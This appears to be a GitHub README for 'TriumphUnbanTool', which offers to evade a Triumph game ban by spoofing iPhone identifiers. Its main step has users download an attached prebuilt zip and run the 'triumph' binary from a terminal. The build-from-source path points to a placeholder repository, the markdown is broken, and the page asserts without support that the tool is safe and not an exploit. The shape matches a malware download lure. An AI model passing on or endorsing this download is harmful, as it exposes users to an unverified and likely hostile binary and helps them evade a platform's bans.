## TriumphUnbanTool v1.0.0 — macOS Unban Tool

A command-line tool that helps you unban from the **Triumph** game by changing device identifiers on your iPhone over USB.

- Works with any iPhone and modern iOS via USB lockdown protocol.
- No jailbreak needed — just a simple, step-by-step unban workflow.

### How to Use:

1. Plug in Iphone through cable connection

2. Make sure device is unlocked and awake

3. Download:
[TriumphUnbanTool-1.0.0-macOS.zip](https://github.com/user-attachments/files/35292176/TriumphUnbanTool-1.0.0-macOS.zip)


4. Open folder and drag "triumph" into a fresh terminal and hit return

Markdown
## Prerequisites & Installation

### System Requirements
* **macOS** (Apple Silicon recommended)
* **Xcode Command Line Tools** (provides `swift` and `git` to build from source)
* **Homebrew** (package manager for macOS)
* **libimobiledevice** (required for USB device identification and communication)
* **USB Data Cable** (must support data transfer; charge-only cables will not detect the device)

---

### 1. Install Dependencies

1. **Install Xcode Command Line Tools** (if not already installed):
   ```bash
   xcode-select --install
Install Homebrew (if not already installed):

Bash
/bin/bash -c "$(curl -fsSL [https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh](https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh))"
After installation finishes, add Homebrew to your PATH (Apple Silicon Macs):

Bash
echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
eval "$(/opt/homebrew/bin/brew shellenv)"
Install libimobiledevice:

Bash
brew install libimobiledevice
2. Build & Run
Clone the repository and compile locally to avoid macOS Gatekeeper warnings:

Bash
git clone [https://github.com/nomanclazure/](https://github.com/nomanclazure/)<your-repo-name>.git
cd <your-repo-name>
swift build -c release
.build/release/triumph
3. Device Setup
Connect your iPhone to your Mac using a data-capable USB cable.

Unlock your iPhone and tap Trust if prompted on screen.

Verify your Mac detects the device before running the tool:

Bash
idevice_id -l

5. Follow the steps in terminal

### What it does:
- Lifts bans by simulating what you'd do manually (resetting IDFA, IDFV, IP).
- No changes to your Mac — clean and safe.

### Notes:
> This is a *tool* — not an exploit. It simulates what you would do manually (like resetting your advertising ID or changing network settings).

### License
MIT — see [LICENSE](LICENSE)
